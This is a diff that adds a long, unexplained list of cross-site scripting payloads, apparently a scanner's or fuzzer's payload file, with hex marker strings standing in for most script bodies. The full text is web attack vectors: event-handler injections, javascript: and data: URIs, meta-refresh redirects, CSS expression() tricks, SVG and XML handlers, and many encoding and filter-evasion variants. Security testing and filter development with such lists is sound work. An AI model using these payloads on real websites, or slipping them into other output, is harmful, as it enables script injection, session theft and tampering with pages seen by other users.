+<iframe src iframe src="javascript:javascript:4cd87c639c838f9ed9ae2a219d5a7381"></iframe src>
+<IFRAME SRC="javascript:e3a1d1fe04728ca93dcf0e11d8e3c19d <
+<IFRAME SRC="javascript:javascript:d3b9f91291f4466175e752844a59a14b;"></IFRAME>
+<iframe/src \/\/onload = prompt(dde5684c1f99919bebedcfa2af237b38)
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(0183a8e92d6f3b36f64e1b57bf960ce7)">
+<!--[if]><script>8b8d18d51cf364bdf02f539d2784a2e3</script -->
+<!--[if]><script>javascript:f593d79c2c214baa580b993d21602381</script -->
+<image src=1 href=1 onerror="23cfd4b4f909b51eec48e7a1a1443d39"></image>
+<image src=1 href=1 onerror="javascript:4dc93a10cdcb935f0e2e8f8213b42ec3"></image>
+<image src="javascript:899686984b10049b4bcc5d6f95bfaced">
+<img/&#09;&#10;&#11; src='~' onerror=prompt(1ce2f131cc5175d262fe9438fad44d98)>
+<IMG """>30f6e40f0f31f8f05cdbc0399086d5d3">
+<img[a][b][c]src[d]=x[e]onerror=[f]"8c3878c4227054c455958b98466b4f83">
+<IMG DYNSRC="ab04b6180c9638870c8b2c9610b040aa">
+<IMG DYNSRC="javascript:javascript:0f6f9839bb7865a521b7bfa141297678">
+<IMG LOWSRC="7050d0600f9fd4dea95ecd0c41fe384b">
+<IMG LOWSRC="javascript:javascript:a829e35f01c9e4c289d98f626ffe83be">
+<img src=`%00`&NewLine; onerror=5e906b03c8727686625bbf9323f51f67&NewLine;
+<img src='%00'&NewLine; onerror=alert(b1075bd018cdbe52d0d68a658701f688)&NewLine;
+<img/src='%00' onerror=this.onerror=confirm(e3f61c9f4d5fe0b9e1b3b51891fd0f75)
+<IMG SRC=" &#14;  dd2d88fcd16e1f695fa0cd499e5d1071">
+--- <IMG SRC=" &#14;  ec6c9ab17933ea4a74d9c0910b1f3c8e">
+<IMG SRC="&14;javascript:e3513e06931465efc476301529b292fb">
+<img src=1 href=1 onerror="64dc8f2344b5f80aed7e8f2888382546"></img>
+<img src=1 href=1 onerror="javascript:d613c545c323bc474deaa3dea290eb0c"></img>
+<IMG SRC=44dca80d2688db9c53db79854e1cedce>
+--- <IMG SRC="6b16926accebc46bf0d49959b7f20a3d"
+<IMG SRC='ad849b7c02ad90acbad6ef28215dcab3'
+<IMG SRC=`b325b5e3c8f3dcc1b830ed5540e2fef5`>
+<IMG SRC="dba8c4a70ef11a4ba23a176aa3d381d0">
+<IMG SRC=&{edbe05fcd002069f561d0e6b48bc8bd7};>
+<img/src='http://i.imgur.com/removed.png' onmouseover=&Tab;prompt(55bff9a790ad1c557282870d49fa2a31)
+<!--<img src="--><img src=x onerror=4569ebcf6f942579055dfe496dd738b1//">
+<![><img src="]><img src=x onerror=7aa76f74befff1ecb5e5e5184a1226f0//">
+<!--<img src="--><img src=x onerror=javascript:707cfaa648515e77d758d86c5c1931d0//">
+<![><img src="]><img src=x onerror=javascript:ad0af43b2238025e94f5474465c7ac21//">
+<img src ?itworksonchrome?\/onerror = c65e66e62bb6093a79b9d0fa17387910
+<img src="javascript:5a15f91793ff0dc0306a0b6de8be5c1b">
+<IMG SRC=JaVaScRiPt:6bfedbdf2109fc39bcc5c01f229dd53d>
+<IMG SRC=&{javascript:96f3eba0e3e173c6f54d1b2b4a209e55;};>
+<IMG SRC="javascript:javascript:196f909dcd01b56ee975a60ba014446f;">
+<IMG SRC=javascript:javascript:4e7e93c95c55bbe66fa087f53d8a84f6>
+<IMG SRC=`javascript:javascript:6a7e24055d06f536c172cac96032107a`>
+<IMG SRC="jav    ascript:javascript:7899d2a8a3f4cf7448f7f6b6ef4a4fc7;">
+<IMG SRC="jav&#x0D;ascript:30694810a67152a0cd5f9797903c2704">
+<IMG SRC="livescript:[1074206f6b3c3ccda20dd7e98395440c]">
+<IMG SRC="mocha:[a3babaedaa3aa701c596e02e1128d1ff]">
+<--'<img/src=' onerror=alert(af87332382a6eefa5a52df7c79b7244f)> --!>
+<img src onerror /" '"= alt=1ae47b0411307e85da0c34d780f03894//">
+<img src onerror /" '"= alt=javascript:7ca4bba13ca89dddbf8a2f25a0b16c72//">
+<--`<img/src=` onerror=ce7852d085719f5e60f209b5becf8354> --!>
+<img src ?psy?\/onerror = alert(c62fae935efef9f773d4bef7c52414ad)
+<img src="/" =_=" title="onerror="prompt(5bdccbcdf9508362c453ef234f2f2199)"">
+<IMG SRC='vbscript:b6f54b57dc296244fa75c066f634411a'>
+'><img src=x onerror=window.open('a73e32ff78907e95c63f6a20478d8dc2');>
+<img src="x` `<script>909019f8e3136c92076731b231dff906</script>"` `>
+<img src="x` `<script>javascript:720125d24cb6204febac4c5b6d11eb68</script>"` `>
+"><img src="x:x" onerror="6c617abfca9ad03c80026c1b54113863">
+<img src=`xx:xx`onerror=1290391d3c8c94b5a47341cd52bfe12d
+<img src='xx:xx'onerror=alert(ce276df706e46187ba02624a296da80b)>
+--><!-- ---> <img src=xxx:x onerror=javascript:5f14b6ee52f1a4ce5d937c52489f29bd> -->
+<IMG STYLE="X:expr/*X*/ession(6a291307422081e7acccd992c6135a9b)">
+<IMG STYLE="x:expr/*X*/ession(javascript:c6835256856d6c88233b46f916ff3d22)">
+<input onblur=4b243152b8c366125ee1f478560dd0f6 autofocus><input autofocus>
+<input onblur=javascript:c3af2db8d9d3b2fe460532f60bd03e5f autofocus><input autofocus>
+<input onfocus=ac35a2d7b1c8c6b2bd210c2f1b63ca8b autofocus>
+<input onfocus=javascript:8e310bae52fea3a91f82dae294e58c31 autofocus>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;4104aa613a4f9a58c7173d472ba79114&rpar;"
+<input type="image" dynsrc="8577e2f9f456e14a1e90dee222f25acf">
+<INPUT TYPE="IMAGE" SRC="16570b8419e0d74f5d2ab24370814f6f">
+<INPUT TYPE="IMAGE" SRC="javascript:1b4b74bba6ebbfa2c8b0e0cbe38485e3;">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:d496f6b43389c2ba614f469423e44e04;">
+<input type="text" value=`` <div/onmouseover='727bfc6c2f71c0ae094ca3399dbf0b5f'>X</div>
+<input type='text' value='' <div/onmouseover='alert(29518029eec2d01312cc2d7fdd4590cb)'>X</div>
+<input value=<><iframe/src=javascript:confirm(dd82e1313c6a7f5a89ad404d92e93ab2)
+<keygen onfocus=javascript:90c8c6f1e6b0d16f97eadcd831e77417 autofocus>
+<LAYER SRC="5420b7380880f76cffb26495ded65117"></LAYER>
+<LAYER SRC="javascript:5a154950ce450e1210e58f0ce8ee6571></LAYER>
+<LINK REL="stylesheet" HREF="af2d571b4b0f16ace9495986a92f4ff4">
+<link rel=stylesheet href=data:,*%7bx:expression(a00a2e1f647785d2a9eab2f7a9f1c8a1)%7d
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:a3aa33430776c7fdef384ee6e1f6720c)%7d
+<LINK REL="stylesheet" HREF="javascript:javascript:758170b7348d3b6efc0c9abfa0194733;">
+<li style=list-style:url() onerror=7f8346f3f1fbc59f1f2320d0ea167aca> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=7f8346f3f1fbc59f1f2320d0ea167aca></div>
+<li style=list-style:url() onerror=javascript:730d6a6cd47847c5b420b318df786cce> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:730d6a6cd47847c5b420b318df786cce></div>
+<marquee onScroll marquee onScroll="javascript:69d6e8f22a879678fc96ae12971d2e5c"></marquee onScroll>
+<marquee onScroll marquee onScroll="javascript:javascript:f38abfc31ce17275f00aa9991cec3ab4"></marquee onScroll>
+<marquee onstart='javascript:alert&#x28;133dc8b57c9c1ffb6e5849948b15200f&#x29;'>^__^
+<marquee onstart='javascript:ef206a5e9201710d3b50b239ebabd46d&#x28;1&#x29;'>^__^
+<marquee onStart marquee onStart="javascript:fa215bd57dc417f8cea05fe69cc5c516"></marquee onStart>
+<marquee onStart marquee onStart="javascript:javascript:c2636d083cda69c44ee1f8671a874b40"></marquee onStart>
+<math><a xlink:href="b639170be8757fbb7e40aaae916b35dc">click
+<math href="javascript:33f3205eb6b6e488d23e0f658c290aa8">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:33f3205eb6b6e488d23e0f658c290aa8">CLICKME</maction> </math>
+<math href="javascript:javascript:64ad0e3dcde3eddb9fa014b4ee7c6e21">X</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:64ad0e3dcde3eddb9fa014b4ee7c6e21">X</maction> </math>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>3b63a90783619b529b4390068004fc76&&;&&<&&/script&&>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:a5391dc60f1f82cc4033a62ac290138d&&;&&<&&/script&&>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(3214afebdcc78fe5508b7b9e0880fbe4)" http-equiv="refresh"/>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; e73e487b2597304e96c8e354f2052510" http-equiv="refresh"/>
+<META HTTP-EQUIV="Link" Content="<ac7bdbf52292ff9f0f54100b6127f6a5>; REL=stylesheet">
+<META HTTP-EQUIVo"refresh" CONTENT="0; URL=http://;URL=0f8f15a42407d35a74206d77c7d66c17">
+<meta http-equiv="refresh" content="0;javascript&colon;0501e5e7a550eb1c974248c282392d0c"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(30be14979c1552477e18c3f29da41d59)"/>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=a190ea71c5816d54954c88f6fdff0121">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:fa2cd4521ff8fa176de7ebac5b084298;">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(eb0ef0591c439743e271b6066196a9d0)">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:d7f321eb2435455f538bca52033c3c1b;">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;4282a74d1ba6d545ca37dd7fd64d5af0&lt;/SCRIPT&gt;">
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:699ced55b4fc112122fb5e90879e5102"></OBJECT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(6dc928b3139467019e55baa0bfb0dcb0)"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=0419a7bdb237d751db26f9be754fdb52></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:43e7b08d174b5a511d6d66cdbc303a4b></OBJECT>
+<OBJECT classid=clsid:..." codebase="javascript:bd5693ad5c96196a1f41fbea551b69eb">
+<object data="b594a2771dd376e3be4a62f5d44eccb6">
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(b48fb2b9a64ed6acab6fe9f8dce711e1)>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:aacc67969d887a76c8967c6064ed28d3" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object onbeforeload object onbeforeload="javascript:820f9341bba01585b6c834ec0972a10c"></object onbeforeload>
+<object onbeforeload object onbeforeload="javascript:javascript:dfd289e24c6f7bdb5b4a0717f87ca669"></object onbeforeload>
+<object onerror=javascript:ee33d091b4d6d596c5cd65f887c75c84>
+<object onerror=javascript:javascript:005628ca3a33d8acdb5c79a9decc0cfd>
+<object onError object onError="javascript:1054a59ce839a7d73054d4dcdba3445b"></object onError>
+<object onError object onError="javascript:javascript:71855d27792a0d07c86cee623dbc682f"></object onError>
+<object src=1 href=1 onerror="8a276360cb3854a5f228cad06d12dc9e"></object>
+<object src=1 href=1 onerror="javascript:2b4bebc84cfecc45c61cf5b3e5e4c433"></object>
+<object type="text/x-scriptlet" data="024482bfa48484ec2099cb53dcedaada "></object>
+</plaintext\></|\><plaintext/onmouseover=prompt(9251fa028adb6b0fd45ff3891d68a707)
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="6322d3d9088782b00c95492fc3562e24">
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:57562f640b2e665b3dce66e315dfa77c">
+<script /*%00*/>/*%00*/alert(ad150adf2b660c0054ea99de1b365f3b)/*%00*/</script /*%00*/
+<script>({0:#0=eval/#0#/#0#(72d92ca665da457c5262d73445b9a65c)})</script>
+<script>({0:#0=eval/#0#/#0#(javascript:b77bc85475d5b2e208cff99852e36ac6)})</script>
+<<SCRIPT>0520377dd890b1fd45c81540b4fac10b//<</SCRIPT>
+<script>+-+-1-+-+alert(567216b1a3630816539e5e767f179865)</script>
+<script>+-+-1-+-+d047aa46f797adf0cdef8425b6aa4671</script>
+<ScRipT 5-0*3+9/3=>prompt(2df21908dd501d8517ad6ff4b9f33bc3)</ScRipT giveanswerhere=?
+<%<!--'%><script>94a9a2c012f2400005d81cd24932100c;</script -->
+<SCRIPT>a=/1d7d088a6c674160e11ff3b66670626f/alert(a.source)</SCRIPT>
+<script<{ab318611bf1f488412eec221282a75b3}/></script </>
+<script ~~~>alert(34a9bc8f3bbc927017acb887c1408738)</script ~~~>
+"><SCRIPT>alert('4e84b8e4a29ced477b758fc555514396')</SCRIPT>
+<%<!--'%><script>alert(bc7a04aeb1d3e9331c2f402550652775);</script -->
+<script ^__^>alert(eec3c9990cc66ccf799f46558cccc831)</script ^__^
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){eval(arguments[0])}),'b':['ee49125ee2d0a5f184b0ec450d70b117']}]</script>
+<SCRIPT>a=/X/nff397612d15b85bc47a9f93aa0ebfddf</SCRIPT>
+<SCRIPT <B>=31da7a04e6d84a40747fafcfb8df1552"></SCRIPT>
+<script /***/>/***/confirm('b24aed3fb44820d8d3b0167f7ffae492')/***/</script /***/
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'45d1d255e2e80aaceec2620cc088c09b',384,null,'rsa-dual-use')</script>
+<SCRIPT FOR=document EVENT=onreadystatechange>d9e0f28ab22bb17432c884525c6dc5dd</SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:5bb360322a5606dbcbe2c03814fe6695</SCRIPT>
+<script>if(document.createElement("td").cellIndex == 0){7e69640c515911ba7afdff072ce1d8eb}</script>
+<script itworksinallbrowsers>/*<script* */1de4cb832a2cdb297ab2dcdda947aed2</script
+"`'><script>-javascript:859d65ec078b4102cf33838a0913b286</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('24a0303dff63e905336a8390a0c9a452')()</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:ca19f0e2b36d132d79632331802cdfb9')()</script>
+<script onLoad script onLoad="javascript:37868e2407d41c846bd2e502b2037b40"></script onLoad>
+<script onLoad script onLoad="javascript:javascript:4187671b687fc8a72aa54f4e348db970"></script onLoad>
+<SCRIPT onreadystatechange=javascript:70ba788f7376eb4d6ca5019140809714;></SCRIPT>
+<SCRIPT onreadystatechange=javascript:javascript:9d043a7fb4257b2ae1e9f6d1d0e51154;></SCRIPT>
+<script onReadyStateChange script onReadyStateChange="javascript:933db3cf529f38211c607b92567f8da7"></script onReadyStateChange>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:5ea4fcc7fbed63e465b582bdcbce6d48"></script onReadyStateChange>
+<script psy>/*<script* */alert(06812a59d8c7acaa6500334dce457538)</script
+<script>ReferenceError.prototype.__defineGetter__('name', function(){53415f644cb55ab6f795552eb2f51a6c}),x</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:1d96d5ed641b14c305641cecbaa93bab}),x</script>
+<script>({set/**/$($){_/**/setter=$,_=824de58ff64b088c759d6423875b8b59}}).$=eval</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:b8d9591cf8d49bde7d98a17427441e38}}).$=eval</script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(78957ab5bbf560ab8c49974debb44bcb)></script>
+<SCRIPT/SRC="168b4d2eeed1e4c6fdf7e72da438e0b0"></SCRIPT>
+<script src=1 href=1 onerror="93ba892fac7c9a4c3539cfc410af301f"></script>
+<script src=1 href=1 onerror="javascript:0287dc64717ddcda31b2a7aac1587da9"></script>
+<script src="#">{4a936ccbaadfa2effafc8a8511f925bb}</script>;1
+//|\ <script //|\ src='75ba0e2e10d7a3f91108b874173c934b'> //|\ </script //|\
+<script src="\99308cea4641edd68d14e35adcf2ef41"></script>
+<SCRIPT SRC=c71b788b9e377a295d2ef7b3d5b6b2f4?<B>
+<script src="/\d926af1c5f5962fd8e8d0c1e5f5a7820"></script>
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert("b92d7fa09b4e2a9a36befcdfb4779ce2")"></script a=\u0061 & /=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/cf94e6acf416d4a81a863263364716e1/)></script
+<script src="data:text/javascript,8fdca74f9e8972e3b2584636bb09f7fc"></script>
+<script src="data:text/javascript,alert(0cc7036e0f051bbb9e690a7829436240)"></script>
+<SCRIPT SRC=http://127.0.0.1>6ea636d339d5a6618ebfce4eee12ec0b</SCRIPT>
+<script src="javascript:4ec71d4765fd6edd937db29b86583ba7">
+<script/&Tab; src='29bd48de5d8f045bbd0ae3421a40b89e' /&Tab;></script>
+<script>v=document.createElement("td").cellIndexif( v == -1){153c16fd4d2cc72e7b60f5506e76ce63}</script>
+<script>v=document.createElement("td").cellIndexif( v> 1){e836c377cbe971fef1960b9057cac81c}</script>
+<script>v=document.createElement("td").cellIndexif( v== undefined){f3d6f36fe2edddd65570a45b0202d3d1}</script>
+<script x> alert(2ff894bda4a5012673e94c31b68d92ab) </script 1=2
+<script x> b650c4a7fe31bbc22c514a5fa44dde64 </script 1=2
+<select onfocus=javascript:58ad1ec26d73d22f2e42969689b817d6 autofocus>
+</style &#32;><script &#32; :-(>/**/alert(e2fb5b4519d7af1a6d8da0cab9e0e6c1)/**/</script &#32; :-(
+<STYLE>a{background:url('s1' 's2)}@import javascript:5a3ecd7891b7957cdfa4ba489f35d865;');}</STYLE>
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:f16c45216f26f551f4400b2aa5178e06;');}</STYLE>
+<STYLE>.c71700a5bc77a3eb40b8b5e495b6f15e{background-image:url("javascript:javascript:c71700a5bc77a3eb40b8b5e495b6f15e");}</STYLE><A CLASS=c71700a5bc77a3eb40b8b5e495b6f15e></A>
+<style><img src="</style><img src=x onerror=1f66f1bedfe4694fe7ac6b40625d93bf//">
+<style><img src="</style><img src=x onerror=javascript:45fd26a3e811b5a15d186216ca7c7fe6//">
+<style>@import "data:,*%7bx:expression(da1d692c9f0140addc9874e8ea511b4d)%7D";</style>
+<style>@import "data:,*%7bx:expression(javascript:c0b574268ba19f63e457d1060486b9e1)%7D";</style>
+<STYLE>@im\port'\jaasc
+<STYLE>li {list-style-image: url("aaa581863554fd8df03597d4d9746c64</STYLE><UL><LI>X
+<STYLE>li {list-style-image: url("javascript:d7bdc5fde9815c607bce42fa228a3907");}</STYLE><UL><LI>X
+<STYLE>li {list-style-image: url("javascript:javascript:ee4aa5e04c7a850b369748c812e0f6cb");}</STYLE><UL><LI>X
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;37fa5aff0fca66ba4de4143665831352&rpar;>
+<style onLoad style onLoad="javascript:a372a756cf70685187e3cf1a120a5a29"></style onLoad>
+<style onLoad style onLoad="javascript:javascript:c31684dc46b4632d6e7cd6ba1b6e14ee"></style onLoad>
+<style onreadystatechange=javascript:13b8a359b68aebda92a150bcf1060ad9;></style>
+<style onReadyStateChange style onReadyStateChange="javascript:0c0c158a227257ea1bcccac2f0a831f8"></style onReadyStateChange>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:357c1f85a68390f274674decefdd4098"></style onReadyStateChange>
+<style>p[foo=bar{}*{-o-link:'javascript:b1ff221787ed9e248bbabc0edfb5eb1e'}{}*{-o-link-source:current}]{color:red};</style>
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:f6dcb8083eb90c2973cf8c375eb4e086'}{}*{-o-link-source:current}]{color:red};</style>
+<///style///><span %2F onmousemove='alert&lpar;efdf5b38259857772e3f2207fde6d834&rpar;'>SPAN
+<style><!--</style><SCRIPT>f0c510e251f59ea297b1321774a6480d//--></SCRIPT>
+<STYLE type="text/css">BODY{background:url("46f9f4ab07c97a1782e153687dc18039")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:a401481d50f3bafdded88f92ccd418d4")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:df4edf4844fae76fbc4faea0d3b3cc48")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:8b0f6d795ee3f54f219316f6976e18f6")}</STYLE>
+<STYLE TYPE="text/javascript">8e4fb2f0651aa8bf4773249465894bf6</STYLE>
+<STYLE TYPE="text/javascript">javascript:7299bca20875a1319ebba3fa00f0ffe4;</STYLE>
+<STYLE>.X{background-image:url("ab3728ec7e6e3d3df7a70bf5c35cd97c");}</STYLE><A CLASS=X></A>
+<STYLE>.X{background-image:url("javascript:69407eab00f544e4346f7af22c7ac64e");}</STYLE><A CLASS=X></A>
+<svg contentScriptType=text/vbs><script>MsgBox+468de91d5e7d8382dd234beb8731cf2b
+<svg> <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.c861e3cbb981403af4c924b386e3be14</script></svg>")'></svg>
+<svg/onload=alert(7b0866ab9015be51b8d5e7977af9fe3e)
+<svg/onload=bdacc4c2922d67f81a1fb3e98c754e75
+<svg onload="javascript:fde1a6d435a08ba2e4d4ba0976315556" xmlns="http://www.w3.org/2000/svg"></svg>
+<svg onLoad svg onLoad="javascript:3015ac6043a9628d6306995d93b5a1c9"></svg onLoad>
+<svg onload svg onload="javascript:9ccee9985acfc8456398d28476076fcc"></svg onload>
+<svg onLoad svg onLoad="javascript:javascript:38de9fbc39388a9d32271608ddcd53c7"></svg onLoad>
+<svg onload svg onload="javascript:javascript:fa376e883b36c97913d2caf53344fe91"></svg onload>
+<svg onResize svg onResize="javascript:5c79a2bca3e08da9a5eb11e51fcbe07b"></svg onResize>
+<svg onResize svg onResize="javascript:javascript:69bb1d7f08c72fce519036676fc34ff9"></svg onResize>
+<svg onUnload svg onUnload="javascript:6f8310f5fa53cab58f5924aee7881339"></svg onUnload>
+<svg onunload svg onunload="javascript:javascript:0d8d1abc4a636f43974b288ecf3fd12f"></svg onunload>
+<svg onUnload svg onUnload="javascript:javascript:ade21845e4ac89ac568334268f75ef0f"></svg onUnload>
+<sVg><scRipt %00>alert&lpar;6a3acb0fb576ef84881b75e0276049ba&rpar;
+<svg><script ?>alert(765646c76a36b1e8703b07bd080a4c6f)
+<svg><script ?>c7a5c8e5569c870029f5a75e3ed7a652
+<svg><script>//&NewLine;confirm(976fdf411f4a3e09a59d96a96d1b35de);</script </svg>
+<svg><script onlypossibleinopera:-)> c2e4a0cefa325e06bddddd6be86ef366
+<svg><script psy> alert(abc4f59037479ee508e0335dd681ff40)
+<svg><script x:href='f14b1118ed802a77b4d535fa896529c2'
+<svg><script xlink:href=data&colon;,window.open('d718418d998b969b51e8b981f80ead2c')></script
+<svg><style>{font-family&colon;'<iframe/onload=confirm(b66745c3bef26c2631de30c110b0c43c)>'
+<svg><style>&ltimg/src=x onerror=b04a10e9df4eb86b7efa413553252592// </b>
+<svg xmlns="http://www.w3.org/2000/svg"> <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:224d57b6df29f2e8099d2c5f9c5e750e"><rect width="1000" height="1000" fill="white"/></a> </svg>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:02f1c352e1c773c7c1ae8a9061385bc4"></g></svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">ebc5db8b6059af79b0a73fc6b663579e</handler> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"> <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E 945f362b899a4c492e548ec34e9eee43 %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" id="x"> <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/> <handler id="y">2fd7170721eb1162fa59cf92ce976dbf</handler> </svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>71c952842179d78496dd9e06a37465ac</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="4990ffb4ac8d7e42137536fd362bb7b1"/> <animate attributeName="onunload" to="4990ffb4ac8d7e42137536fd362bb7b1"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:583fdea725d5dde55fa239f8c8419169"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='583fdea725d5dde55fa239f8c8419169'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(583fdea725d5dde55fa239f8c8419169)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:583fdea725d5dde55fa239f8c8419169"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3E583fdea725d5dde55fa239f8c8419169%3C/script%3E"/> </svg>
+<TABLE BACKGROUND="44e2b050c092dcff35322b7c86155ccc">
+<TABLE BACKGROUND="a94514d6d21edf9dd219afe5a319e2c2">
+<TABLE BACKGROUND=javascript:51c884ab737bc4abcd0fc0cac0abfbfb>
+<table background="javascript:64b09adffcf9546971a22d4a65118af0">
+<TABLE BACKGROUND="javascript:javascript:0ea99dce718958db56251b363cdcb689">
+<table background="javascript:javascript:637c7f4f0ccf3077fcc989a1968dfb7f">
+<TABLE><TD BACKGROUND="37b7748b5f5e10f18de6ebc16269d539">
+<TABLE><TD BACKGROUND="c3ef3121d4295986b6cbe0bfeab43486">
+<TABLE><TD BACKGROUND="javascript:javascript:918480b9f9631734c3729928e9a57fd6">
+<textarea onfocus=javascript:a61eddc136f06060d2d19f3d6b35dbd8 autofocus>
+</TITLE>403306a697e58986cc97414028765792
+<title onpropertychange=e16e41858d47d4f67f104209623991cd></title><title title=>
+<title onpropertychange=javascript:6baab67c7ea321ebdae98ccde12b8c20></title><title title=>
+<title onPropertyChange title onPropertyChange="javascript:c74c9aedfc8af183970ef2b0718f4ede"></title onPropertyChange>
+<title onPropertyChange title onPropertyChange="javascript:javascript:ced813733dc93cceb022db49821f5808"></title onPropertyChange>
+<var onmouseover="prompt(3b515bc779dca8be4f084ae2fc7d1b49)">On Mouse Over</var>
+<video onerror="javascript:7b7d66402498d4fd02fb8fafc54055ff"><source>
+<video poster=javascript:458cd94aee793211e4b45f87b1376b47//
+<video><source onerror="javascript:54e72775a7d61ffe61524ced9c7133b6">
+<video><source onerror="javascript:javascript:7ad88295b32c9ba9ca9854f2377ec866">
+<video src=1 href=1 onerror="d61310fc876a566fcd62e941a9db81f9"></video>
+<video src=1 href=1 onerror="javascript:ccbf98a45faaadef23aee09fce50e55d"></video>
+<x '="foo"><x foo='><img src=x onerror=5b39959461f1fd7e570373e93768fa11//'>
+<x '='foo'><x foo='><img src=x onerror=c7137735a3cb1f05a3afe17a7d7c1daa//'>
+<x '="foo"><x foo='><img src=x onerror=javascript:6e7dc086d82308799378dad2b36c6d37//'>
+X<form id=test><input></form><button form=test onformchange==javascript:3f20a36e3ee90e33b44bacf06b906ee2>X
+X<form id=test onforminput=javascript:1f76eece8a7d5b531d30d8e5c10ac92f><input></form>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:e11c16c55b11c0afcb224f913a74c804">]]</C><X></xml>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:1a9ad741e8a5e85fb8fbee329454bf30;">]]</C><X></xml>
+<xml id="X"><a><b>5836068689d7022a88fc99217f066567;<b></a></xml>
+<xml onPropertyChange xml onPropertyChange="javascript:795e75a6313a3e444c93b56d80e3d829"></xml onPropertyChange>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:a1c38aee42c51513e716eabc662da111"></xml onPropertyChange>
+<?xml-stylesheet href="javascript:24298eeb36877167317022413211f097"?>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "c9d03d334eed135a8dd4218af263c545"><x>&x;</x>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(af28248ed678f2937a0e4264c57b50a5);%7d"?>
+<?xml-stylesheet type="text/css"?><root style="x:expression(671a81a3d9cf311447795ad47ebf6176)"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:16fa31608ab11adab6970cc1633dac71"/>
